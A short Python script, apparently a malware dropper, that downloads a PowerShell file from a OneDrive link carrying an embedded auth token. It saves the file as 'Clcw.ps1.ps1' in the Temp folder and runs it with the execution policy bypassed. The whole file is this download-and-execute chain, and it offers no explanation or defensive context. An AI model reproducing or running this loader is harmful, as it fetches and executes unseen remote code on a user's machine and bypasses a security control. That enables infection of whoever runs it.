import requests
import os
import subprocess

# Your OneDrive link
url = "https://my.microsoftpersonalcontent.com/personal/3ce6f8bdc7595cee/_layouts/15/download.aspx?UniqueId=fce1458c-1c5f-4a15-b69b-fe001711382c&Translate=false&tempauth=v1e.eyJzaXRlaWQiOiI1MWE5MjdkYS05ODQ4LTQ4YzktOGE4NC0wZGUwYjJlNmJjODkiLCJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvbXkubWljcm9zb2Z0cGVyc29uYWxjb250ZW50LmNvbUA5MTg4MDQwZC02YzY3LTRjNWItYjExMi0zNmEzMDRiNjZkYWQiLCJleHAiOiIxNzUyMDQ2Nzk1In0.qUgTBuCJyR9O9mcRn8R5Wl0ohSgVqPNlWAg4rEBFB6WceUvB4CERFOl724Japj8zQ2jFDg6wV9WYnK6I8tvxvBEeBaVDtMv0C9GIRA0TdZlMV3kudG7oiL8NlscqDUgKjo6VloG2wxrsoSMflGGNLBRMKbWz3w6Vcs-MCxdEF47elAIpkbcvfYIHpneaINZdIEOXvUS9CwguSv4cIxZa1HhvNHQviwCogCgydfPFLRgLE0wgTNbIxtGkiBjBLWrcjsg6QpDUgaLlJMc-94ceKhMrf0MKfgU6IseX8A6C8LJWVSGZTYRojEUObYQ9ti33fMvVClhuHwULB1hEeEV9wIrhqQsX7O3AXG750fVgZTn6f3rU-Qj-Atq8dzD3Z9jJqThxOjr5pwB34sMsx_Yw8kkkBaRn3c6BT8l-DzPUrnNcxyTJDKnXCO5AFIMnQfwwNyBdfpAOV5X4tKC7RTpKD6sEa_LQ6-ZUvk0azOAtq-HDVPZRd0SCxUizdjHX6wf3Wf5yHA3iC2xLJXMUyQEiWg.BR154fdoUHqtF6T90vCjInf4S1Iskyf3jiokPzgtjjo&ApiVersion=2.0"

# Get the system Temp folder path
temp_folder = os.environ.get('TEMP', '/tmp')
file_path = os.path.join(temp_folder, 'Clcw.ps1.ps1')

# Download the file
r = requests.get(url, allow_redirects=True)
with open(file_path, 'wb') as f:
    f.write(r.content)

print(f"File downloaded to {file_path}")

# Execute the downloaded PS1 script
try:
    subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", file_path], check=True)
    print("PowerShell script executed successfully.")
except subprocess.CalledProcessError as e:
    print(f"Error executing PowerShell script: {e}")
